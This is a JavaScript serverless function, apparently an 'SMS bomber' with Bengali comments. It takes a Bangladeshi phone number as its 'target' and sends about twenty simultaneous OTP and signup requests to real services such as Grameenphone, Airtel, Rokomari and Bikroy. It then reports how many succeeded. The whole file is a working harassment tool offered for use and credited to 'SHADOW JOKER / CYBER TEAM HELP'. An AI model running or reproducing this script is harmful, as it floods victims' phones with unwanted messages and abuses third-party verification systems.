module.exports = async (req, res) => {
  // CORS Headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') return res.status(200).end();

  const { phone } = req.query;
  if (!phone) return res.status(400).json({ error: "Phone number missing" });

  // Number Formatting
  let clean = phone.replace(/\D/g, '');
  if (clean.startsWith('880')) clean = clean.slice(3);
  if (clean.startsWith('0')) clean = clean.slice(1);
  
  const fmt = {
    raw: '0' + clean,
    noZero: clean,
    with880: '880' + clean,
    plus880: '+880' + clean
  };

  const start = Date.now();

  // ২০টি এপিআই লিস্ট
  const apis = [
    { url: 'https://weblogin.grameenphone.com/backend/api/v1/otp', method: 'POST', body: { msisdn: fmt.raw } },
    { url: 'https://cokestudio23.sslwireless.com/api/check-gp-number', method: 'POST', body: { msisdn: fmt.raw } },
    { url: 'https://api.osudpotro.com/api/v1/users/send_otp', method: 'POST', body: { mobile: '+88-' + fmt.raw, deviceToken: 'web', os: 'web' } },
    { url: 'https://apix.rabbitholebd.com/appv2/login/requestOTP', method: 'POST', body: { mobile: fmt.plus880 } },
    { url: 'https://api.bd.airtel.com/v1/account/login/otp', method: 'POST', body: { phone_number: fmt.raw } },
    { url: 'https://api.swap.com.bd/api/v1/send-otp', method: 'POST', body: { phone: fmt.raw } },
    { url: 'https://www.rokomari.com/otp/send?emailOrPhone=' + fmt.with880, method: 'GET' },
    { url: 'https://api.paragonfood.com.bd/auth/customerlogin', method: 'POST', body: { emailOrPhone: fmt.raw } },
    { url: 'https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=' + fmt.noZero, method: 'GET' },
    { url: 'https://fundesh.com.bd/api/auth/generateOTP', method: 'POST', body: { msisdn: fmt.noZero } },
    { url: 'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=' + fmt.with880, method: 'POST' },
    { url: 'https://app.eonbazar.com/api/auth/register', method: 'POST', body: { mobile: fmt.raw, name: 'User' } },
    { url: 'https://prod-api.viewlift.com/identity/signup?site=prothomalo', method: 'POST', body: { phoneNumber: fmt.plus880 } },
    { url: 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv', method: 'POST', body: { phoneNumber: fmt.plus880 } },
    { url: 'https://api.bd.airtel.com/v1/account/register/otp', method: 'POST', body: { phone_number: fmt.raw } },
    { url: 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', method: 'POST', body: { phone_number: fmt.raw } },
    { url: 'https://tracking.sundarbancourierltd.com/PreBooking/SendPin', method: 'POST', body: { PreBookingRegistrationPhoneNumber: fmt.noZero } },
    { url: 'https://m.cricbuzz.com/cbplus/auth/user/signup', method: 'POST', body: { username: 'test' + Date.now() + '@gmail.com' } },
    { url: 'https://api.swap.com.bd/api/v1/send-otp', method: 'POST', body: { phone: fmt.raw } },
    { url: 'https://weblogin.grameenphone.com/backend/api/v1/otp', method: 'POST', body: { msisdn: fmt.raw } }
  ];

  // এক সাথে সব রিকোয়েস্ট পাঠানো
  const requests = apis.map(api => 
    fetch(api.url, {
      method: api.method,
      headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' },
      body: api.method === 'POST' ? JSON.stringify(api.body) : null,
      signal: AbortSignal.timeout(8000) // ৮ সেকেন্ডের বেশি হলে বাদ যাবে
    }).then(r => r.ok).catch(() => false)
  );

  const results = await Promise.all(requests);
  const time = ((Date.now() - start) / 1000).toFixed(1);

  return res.status(200).json({
    target: fmt.raw,
    total: results.length,
    successful: results.filter(s => s === true).length,
    time_seconds: time,
    credit: "SHADOW JOKER",
    org: "CYBER TEAM HELP"
  });
};
